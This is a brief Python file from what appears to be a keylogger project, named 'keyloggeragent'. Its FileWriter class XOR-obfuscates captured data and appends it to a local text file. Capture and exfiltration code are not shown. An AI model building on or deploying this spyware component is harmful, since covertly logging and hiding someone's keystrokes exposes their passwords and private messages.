from keyloggeragent import Encryptor
from keyloggeragent import IWriter

class FileWriter(IWriter):
    def __init__(self):
        super().__init__()
        self.Encryption = Encryptor()
    def send_data(self, data:str , machine_name: str):
            text = ''
            for i in data:
                text += self.Encryption.encryption_using_xor(i)
            with open('text.txt','a') as file:
                        file.write(text)